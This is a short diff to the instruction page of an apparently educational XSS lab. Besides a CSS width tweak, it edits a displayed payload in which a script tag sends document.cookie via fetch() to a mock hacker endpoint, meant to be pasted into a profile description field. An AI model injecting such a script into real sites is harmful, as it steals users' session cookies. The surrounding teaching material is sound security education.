@@ -62,7 +62,7 @@
             background-color: #daeaf6;
             padding: 20px;
             margin: 10px 0;
-            max-width: 700px;
+            max-width: 730px;
         }
         
         .instruction-section {
@@ -204,7 +204,7 @@
                     <p>• Kada je XSS ranjivost omogućena, unesite sljedeći kod u polje za opis profila:</p>
                     <div class="code-block">
     <pre><code>&lt;script&gt;
-        fetch('<%= protocol %>://<%= host %>/mock-hacker-page?message=' + document.cookie);
+        fetch('https://<%= host %>/mock-hacker-page?message=' + document.cookie);
 &lt;/script&gt;</code></pre>
                     </div>
                 </div>
